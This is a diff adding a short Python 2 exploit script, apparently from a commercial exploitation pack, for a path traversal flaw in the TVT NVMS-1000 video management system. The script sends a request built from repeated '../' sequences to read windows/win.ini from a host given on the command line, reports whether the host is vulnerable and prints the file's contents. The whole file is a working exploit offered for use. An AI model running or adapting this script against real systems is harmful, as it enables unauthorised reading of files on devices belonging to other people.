@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_tvt_1'
+_vendor_ = 'tvt'
+_model_  = ['NVMS-1000']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = 'https://packetstormsecurity.com/files/155663/nvms1000-traversal.txt'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/../../../../../../../../../../../../windows/win.ini' % (host,port)      
+    response = requests.get(url, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if '[extensions]' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
